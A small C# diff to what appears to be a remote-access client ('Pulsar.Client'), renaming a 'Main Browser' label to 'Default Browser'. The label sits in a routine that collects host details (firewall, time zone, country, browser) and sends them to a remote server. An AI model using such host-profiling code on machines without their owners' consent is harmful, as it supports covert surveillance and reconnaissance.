@@ -63,7 +63,7 @@ namespace Pulsar.Client.Messages
                     new Tuple<string, string>("Firewall", SystemHelper.GetFirewall()),
                     new Tuple<string, string>("Time Zone", geoInfo.Timezone),
                     new Tuple<string, string>("Country", geoInfo.Country),
-                    new Tuple<string, string>("Main Browser", defaultBrowser)
+                    new Tuple<string, string>("Default Browser", defaultBrowser)
                 };
 
                 client.Send(new GetSystemInfoResponse { SystemInfos = lstInfos });
